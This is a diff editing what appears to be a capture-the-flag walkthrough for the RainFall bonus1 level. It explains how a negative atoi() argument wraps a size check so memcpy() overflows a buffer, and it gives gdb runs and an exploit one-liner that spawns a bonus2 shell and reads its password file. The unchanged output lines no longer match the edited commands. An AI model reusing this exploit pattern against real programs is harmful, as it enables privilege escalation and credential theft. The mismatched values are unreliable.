@@ -53,13 +53,13 @@ We observe that <code>atoi()</code> is invoked on <code>av[1]</code> to convert 
 ## buffer overflow
 Another call we observe is to the <code>memcpy()</code> function, where a string from <code>av[2]</code> is combined with the multiplied number. Since the copying function doesn't inherently perform boundary checks, we decide that a <code>buffer overflow</code> attack is our way forward. We can determine the offset value as before, but we need to figure out how to significantly increase the value of the multiplied number, since the biggest value we can achieve is 36.
 
-The maximum value for an unsigned 32-bit integer is 4294967295. Dividing this number by 4 gives us 1073741824. This may still be too large, so we decide to decrease the final number by 280. By subtracting 70 from the digit and passing -1073741754 as the first argument, we are able to test for the offset.
+The maximum value for an unsigned 32-bit integer is 4294967295. Dividing this number by 4 gives us 1073741823. This may still be too large, so we decide to decrease the final number by 25.
 
 ``` shell
-(gdb) run -1073741824 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
+(gdb) run -1073741823 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
 Starting program: /home/user/bonus1/bonus1 -1073741824 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
 [Inferior 1 (process 5146) exited normally]
-(gdb) run -1073741799 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
+(gdb) run -1073741798 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
 Starting program: /home/user/bonus1/bonus1 -1073741799 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A'
 
 Program received signal SIGSEGV, Segmentation fault.
@@ -76,7 +76,7 @@ Due to this, our exploit jumps to the address <code>0x08048482</code> to continu
 
 ## exploit
 ``` shell
-bonus1@RainFall:~$ ./bonus1 -1073741799 $(python -c 'print "\x90" * 56 + "\x08\x04\x84\x82"[::-1]')
+bonus1@RainFall:~$ ./bonus1 -1073741798 $(python -c 'print "\x90" * 56 + "\x08\x04\x84\x82"[::-1]')
 $ whoami
 bonus2
 $ cat /home/user/bonus2/.pass
